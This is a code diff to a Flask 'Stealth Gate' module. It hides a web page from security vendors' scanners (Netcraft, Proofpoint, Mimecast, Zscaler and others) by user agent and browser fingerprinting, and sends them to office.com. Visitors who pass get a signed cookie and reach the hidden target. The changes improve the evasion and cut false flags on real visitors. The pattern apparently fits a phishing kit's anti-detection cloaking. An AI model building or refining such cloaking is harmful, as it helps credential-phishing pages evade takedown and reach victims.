@@ -24,6 +24,17 @@ KNOWN_BOT_USER_AGENTS = [
     'netcraft', 'barracuda', 'proofpoint', 'mimecast', 'zscaler', 'symantec'
 ]
 
+def get_client_ip(req=None):
+    """Accurately extract client IP handling Cloudflare, proxies, and direct connections."""
+    r = req or request
+    cf = r.headers.get('CF-Connecting-IP')
+    if cf:
+        return cf.strip()
+    xff = r.headers.get('X-Forwarded-For')
+    if xff:
+        return xff.split(',')[0].strip()
+    return r.remote_addr or '127.0.0.1'
+
 def is_gate_enabled():
     """Check if the Stealth Gate is toggled on in settings.json."""
     if SETTINGS_PATH.exists():
@@ -47,27 +58,42 @@ def get_fallback_url():
     return getattr(Config, 'FALLBACK_URL', 'https://www.office.com/')
 
 def generate_gate_token(client_ip, user_agent):
-    """Generate a signed, tamper-proof HMAC verification token."""
+    """Generate a signed, tamper-proof HMAC verification token. Uses pipe delimiter for IPv6 safety."""
     expiry = int(time.time()) + TOKEN_TTL_SECONDS
-    payload = f"{client_ip}:{user_agent[:40]}:{expiry}"
+    clean_ip = (client_ip or '').strip()
+    ua_sub = (user_agent or '')[:40]
+    payload = f"{clean_ip}|{ua_sub}|{expiry}"
     signature = hmac.new(GATE_SECRET_KEY.encode(), payload.encode(), hashlib.sha256).hexdigest()
-    return f"{payload}:{signature}"
+    return f"{payload}|{signature}"
 
 def verify_gate_token(token, client_ip, user_agent):
     """Validate token integrity, client binding, and expiration."""
-    if not token or ':' not in token:
+    if not token:
         return False
     try:
-        parts = token.split(':')
-        if len(parts) != 4:
+        clean_ip = (client_ip or '').strip()
+        ua_sub = (user_agent or '')[:40]
+        # Support pipe '|' delimiter (robust to IPv6) and legacy ':'
+        if '|' in token:
+            parts = token.split('|')
+            if len(parts) != 4:
+                return False
+            ip, tok_ua, expiry_str, signature = parts
+            expected_payload = f"{ip}|{tok_ua}|{expiry_str}"
+        elif ':' in token:
+            parts = token.split(':')
+            if len(parts) != 4:
+                return False
+            ip, tok_ua, expiry_str, signature = parts
+            expected_payload = f"{ip}:{tok_ua}:{expiry_str}"
+        else:
             return False
-        ip, ua_sub, expiry_str, signature = parts
+
         expiry = int(expiry_str)
         if time.time() > expiry:
             return False
-        if ip != client_ip:
+        if ip != clean_ip:
             return False
-        expected_payload = f"{ip}:{ua_sub}:{expiry}"
         expected_sig = hmac.new(GATE_SECRET_KEY.encode(), expected_payload.encode(), hashlib.sha256).hexdigest()
         return hmac.compare_digest(signature, expected_sig)
     except Exception:
@@ -82,6 +108,8 @@ def is_known_bot(user_agent):
 
 def render_gate_challenge(target_url):
     """Render client-side browser verification page."""
+    fallback_url = get_fallback_url()
+    clean_target = target_url.rstrip('?') if target_url.endswith('?') else target_url
     html = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -163,10 +191,10 @@ def render_gate_challenge(target_url):
                 if (window.screen.width === 0 || window.screen.height === 0) isBot = true;
                 if (window.outerWidth === 0 && window.outerHeight === 0) isBot = true;
 
-                // 3. Languages check
-                if (!navigator.languages || navigator.languages.length === 0) isBot = true;
+                // 3. Languages check (safe for privacy browsers)
+                if (!navigator.language && (!navigator.languages || navigator.languages.length === 0)) isBot = true;
 
-                // 4. WebGL context renderer check
+                // 4. WebGL context renderer check (safe for virtualized enterprise desktops)
                 try {
                     var canvas = document.createElement('canvas');
                     var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -174,7 +202,7 @@ def render_gate_challenge(target_url):
                         var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                         if (debugInfo) {
                             var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '';
-                            if (renderer.indexOf('SwiftShader') !== -1 || renderer.indexOf('llvmpipe') !== -1) {
+                            if ((renderer.indexOf('SwiftShader') !== -1 || renderer.indexOf('llvmpipe') !== -1) && (window.outerWidth <= 800 && window.outerHeight <= 600)) {
                                 isBot = true;
                             }
                         }
@@ -182,7 +210,8 @@ def render_gate_challenge(target_url):
                 } catch(e) {}
 
                 // Send verification payload
-                var target = {{ target_url|tojson }};
+                var target = {{ clean_target|tojson }};
+                var fallback = {{ fallback_url|tojson }};
                 var payload = {
                     is_bot: isBot,
                     target: target,
@@ -201,11 +230,11 @@ def render_gate_challenge(target_url):
                         if (data && data.success && data.redirect) {
                             window.location.replace(data.redirect);
                         } else {
-                            window.location.replace("https://www.office.com/");
+                            window.location.replace(fallback);
                         }
                     })
                     .catch(function() {
-                        window.location.replace("https://www.office.com/");
+                        window.location.replace(fallback);
                     });
                 }, 1200);
             }
@@ -219,7 +248,7 @@ def render_gate_challenge(target_url):
     </script>
 </body>
 </html>"""
-    return render_template_string(html, target_url=target_url)
+    return render_template_string(html, clean_target=clean_target, fallback_url=fallback_url)
 
 def log_bot_hit(client_ip, user_agent, bot_type="scanner", host=None, path=None):
     """Record deflected bot hit to deployment_hits table."""
@@ -289,7 +318,7 @@ def require_human_gate(f):
         if not is_gate_enabled():
             return f(*args, **kwargs)
 
-        client_ip = request.headers.get('CF-Connecting-IP') or request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        client_ip = get_client_ip(request)
         user_agent = request.headers.get('User-Agent', '')
 
         # ── Operator test bypass ──────────────────────────────────────
@@ -300,7 +329,8 @@ def require_human_gate(f):
         if op_tok and _verify_op_test_token(op_tok):
             token = generate_gate_token(client_ip, user_agent)
             resp = make_response(f(*args, **kwargs))
-            resp.set_cookie('gate_token', token, max_age=7200, httponly=True, samesite='Lax')
+            is_secure = request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https'
+            resp.set_cookie('gate_token', token, max_age=7200, httponly=True, samesite='Lax', secure=is_secure, path='/')
             return resp
 
         # Deflect known automated crawlers immediately
@@ -314,5 +344,6 @@ def require_human_gate(f):
             return f(*args, **kwargs)
 
         # Serve challenge if not yet validated
-        return render_gate_challenge(request.full_path)
+        target_path = request.full_path.rstrip('?') if request.full_path.endswith('?') else request.full_path
+        return render_gate_challenge(target_path)
     return decorated_function
